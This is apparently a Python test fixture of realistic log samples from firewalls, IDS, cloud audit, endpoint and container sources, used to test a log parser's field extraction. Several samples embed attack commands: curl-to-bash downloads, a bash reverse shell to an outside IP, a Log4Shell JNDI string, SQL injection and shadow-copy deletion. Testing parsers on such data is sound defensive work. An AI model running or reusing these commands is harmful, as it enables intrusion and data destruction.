"""Realistic samples of the log formats seen in real engagements.

Each entry names the format, the fields that must be recovered from it, and one
or two lines taken from the shape that platform actually emits. The engine
claims to read any log, and this corpus is what holds that claim to account.

Entry: (identifier, expected data source or None for any, required fields, lines)
"""

SAMPLES = [
# ---------------------------------------------------------------- network
("cisco_asa", None, ["source.ip", "destination.ip"], [
 "Mar 11 2026 08:15:22 fw-01 : %ASA-6-302013: Built outbound TCP connection 12345 for outside:203.0.113.9/443 (203.0.113.9/443) to inside:10.20.4.15/51000 (10.20.4.15/51000)",
 "Mar 11 2026 08:15:25 fw-01 : %ASA-4-106023: Deny tcp src outside:198.51.100.7/44321 dst inside:10.20.9.10/3389 by access-group \"outside_access_in\"",
]),
("fortinet_kv", None, ["source.ip", "destination.ip", "user.name"], [
 'date=2026-03-11 time=08:15:22 devname="FGT-01" devid="FG100D" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=10.20.4.15 srcport=51000 dstip=91.240.118.172 dstport=443 proto=6 action="accept" user="j.dupont" sentbyte=1420 rcvdbyte=3180',
]),
("palo_alto_csv", None, ["source.ip", "destination.ip"], [
 "1,2026/03/11 08:15:22,001801054075,TRAFFIC,end,2049,2026/03/11 08:15:22,10.20.4.15,185.220.101.44,0.0.0.0,0.0.0.0,allow-all,j.dupont,,ssl,vsys1,trust,untrust,ae1.100,ae2.100,Log-Forwarding,2026/03/11 08:15:22,12345,1,51000,8443,0,0,0x400053,tcp,allow,1420,3180",
]),
("aws_vpc_flow", None, ["source.ip", "destination.ip"], [
 "2 123456789012 eni-0abc12345 10.20.4.15 185.220.101.44 51000 8443 6 12 1420 1773216000 1773216060 ACCEPT OK",
]),
("windows_firewall", None, ["source.ip", "destination.ip"], [
 "#Version: 1.5", "#Software: Microsoft Windows Firewall",
 "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path",
 "2026-03-11 08:15:22 ALLOW TCP 10.20.4.15 185.220.101.44 51000 8443 0 - 0 0 0 - - - SEND",
]),
("suricata_eve", "ids", ["source.ip", "destination.ip", "rule.name"], [
 '{"timestamp":"2026-03-11T08:15:22.123456+0000","flow_id":123,"event_type":"alert","src_ip":"185.220.101.44","src_port":8443,"dest_ip":"10.20.4.15","dest_port":51000,"proto":"TCP","alert":{"signature":"ET MALWARE Cobalt Strike Beacon","category":"A Network Trojan was detected","severity":1}}',
]),
("zeek_json", None, ["source.ip", "destination.ip"], [
 '{"ts":"2026-03-11T08:15:22.123456Z","uid":"CabcDe","id.orig_h":"10.20.4.15","id.orig_p":51000,"id.resp_h":"185.220.101.44","id.resp_p":8443,"proto":"tcp","service":"ssl","orig_bytes":1420,"resp_bytes":3180}',
]),
# ------------------------------------------------------------------- unix
("auditd", None, ["process.executable"], [
 'type=EXECVE msg=audit(1773216000.123:456): argc=3 a0="/bin/bash" a1="-c" a2="curl http://185.220.101.44/x.sh|bash"',
 'type=SYSCALL msg=audit(1773216000.123:456): arch=c000003e syscall=59 success=yes exit=0 uid=0 gid=0 euid=0 comm="bash" exe="/usr/bin/bash" key="exec"',
]),
("journald_json", None, ["host.name", "message"], [
 '{"__REALTIME_TIMESTAMP":"1773216000123456","PRIORITY":"6","_HOSTNAME":"srv-web-01","_COMM":"sshd","SYSLOG_IDENTIFIER":"sshd","MESSAGE":"Accepted publickey for deploy from 10.20.5.44 port 51234 ssh2","_UID":"0","_PID":"2001"}',
]),
("apache_error", None, ["message"], [
 "[Wed Mar 11 08:15:22.123456 2026] [php:error] [pid 2345] [client 203.0.113.45:44321] PHP Warning: include(): Failed opening '/var/www/uploads/shell.php'",
]),
("nginx_error", None, ["message"], [
 '2026/03/11 08:15:22 [error] 2345#0: *123 open() "/var/www/html/admin/config" failed (2: No such file or directory), client: 203.0.113.45, server: app.corp.example, request: "GET /admin/config HTTP/1.1"',
]),
("haproxy", None, ["source.ip"], [
 'Mar 11 08:15:22 lb-01 haproxy[1234]: 203.0.113.45:44321 [11/Mar/2026:08:15:22.123] https-in app-backend/app-02 0/0/1/12/13 200 4523 - - ---- 25/25/2/1/0 0/0 "GET /api/v1/orders HTTP/1.1"',
]),
("squid", None, ["source.ip", "url.original"], [
 "1773216000.123    145 10.20.4.15 TCP_MISS/200 4523 GET http://185.220.101.44/update.dat - HIER_DIRECT/185.220.101.44 application/octet-stream",
]),
# ------------------------------------------------------------------ cloud
("gcp_audit", None, ["user.name"], [
 '{"protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","authenticationInfo":{"principalEmail":"attacker@corp.example"},"requestMetadata":{"callerIp":"45.155.205.87"},"serviceName":"iam.googleapis.com","methodName":"google.iam.admin.v1.CreateServiceAccountKey","resourceName":"projects/prod/serviceAccounts/svc"},"insertId":"abc","timestamp":"2026-03-11T08:15:22.123Z","severity":"NOTICE"}',
]),
("azure_signin", None, ["user.name", "source.ip"], [
 '{"time":"2026-03-11T08:15:22.123Z","category":"SignInLogs","operationName":"Sign-in activity","properties":{"userPrincipalName":"p.novak@corp.example","ipAddress":"45.155.205.87","appDisplayName":"Office 365","riskState":"atRisk","riskLevelDuringSignIn":"high","status":{"errorCode":0}}}',
]),
("cloudflare", None, ["source.ip", "url.original"], [
 '{"ClientIP":"203.0.113.45","ClientRequestHost":"app.corp.example","ClientRequestMethod":"GET","ClientRequestURI":"/api/v1/orders?id=1%27+UNION+SELECT","EdgeResponseStatus":200,"EdgeStartTimestamp":"2026-03-11T08:15:22Z","ClientRequestUserAgent":"sqlmap/1.8"}',
]),
("o365_message_trace", None, ["email.sender", "email.recipient"], [
 "Origin,MessageId,Received,SenderAddress,RecipientAddress,Subject,Status,ToIP,FromIP,Size,MessageTraceId",
 'Inbound,<abc@mail>,2026-03-11T08:15:22Z,attacker@evil.example,p.novak@corp.example,"Invoice overdue",Delivered,10.0.0.1,45.155.205.87,24512,xyz',
]),
# --------------------------------------------------------------- endpoint
("sysmon_linux", None, ["process.command_line"], [
 '{"@timestamp":"2026-03-11T08:15:22.123Z","host":{"name":"srv-web-01"},"process":{"executable":"/bin/bash","command_line":"bash -i >& /dev/tcp/185.220.101.44/4444 0>&1","pid":2345},"user":{"name":"oracle"},"event":{"code":1,"provider":"Linux-Sysmon"}}',
]),
("crowdstrike_like", None, ["host.name", "process.command_line"], [
 '{"timestamp":"2026-03-11T08:15:22Z","event_simpleName":"ProcessRollup2","ComputerName":"WS-FIN-014","UserName":"j.dupont","ImageFileName":"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\cmd.exe","CommandLine":"cmd.exe /c whoami","ParentBaseFileName":"WINWORD.EXE"}',
]),
("osquery", None, ["host.name"], [
 '{"name":"process_events","hostIdentifier":"WS-ENG-101","calendarTime":"Wed Mar 11 08:15:22 2026 UTC","unixTime":1773216922,"columns":{"cmdline":"vssadmin.exe delete shadows /all","path":"/C:/Windows/System32/vssadmin.exe","uid":"0"},"action":"added"}',
]),
# -------------------------------------------------------------- app / mail
("log4j_text", None, ["message"], [
 "2026-03-11 08:15:22,456 ERROR [http-nio-8080-exec-3] c.c.a.OrderController - Unhandled exception processing ${jndi:ldap://185.220.101.44/a}",
]),
("postfix", None, ["message"], [
 "Mar 11 08:15:22 mail-01 postfix/smtpd[2345]: NOQUEUE: reject: RCPT from unknown[45.155.205.87]: 554 5.7.1 <p.novak@corp.example>: Relay access denied",
]),
("exchange_tracking", None, ["email.sender"], [
 "date-time,client-ip,client-hostname,server-ip,source-context,event-id,message-id,recipient-address,sender-address,message-subject",
 '2026-03-11T08:15:22.123Z,45.155.205.87,mail.evil.example,10.0.0.5,,RECEIVE,<abc@mail>,p.novak@corp.example,attacker@evil.example,Invoice overdue',
]),
("mssql_errorlog", None, ["message"], [
 "2026-03-11 08:15:22.45 Logon       Login failed for user 'sa'. Reason: Password did not match. [CLIENT: 203.0.113.45]",
]),
("docker_json", None, ["message"], [
 '{"log":"bash -i \\u003e\\u0026 /dev/tcp/185.220.101.44/4444 0\\u003e\\u00261\\n","stream":"stdout","time":"2026-03-11T08:15:22.123456789Z"}',
]),
("cri_container", None, ["message"], [
 "2026-03-11T08:15:22.123456789Z stdout F curl -s http://185.220.101.44/x.sh | bash",
]),
("k8s_events", None, ["message"], [
 '{"kind":"Event","apiVersion":"v1","metadata":{"name":"debug-shell.abc"},"involvedObject":{"kind":"Pod","name":"debug-shell","namespace":"prod"},"reason":"Created","message":"Created container shell","firstTimestamp":"2026-03-11T08:15:22Z","type":"Normal"}',
]),
]
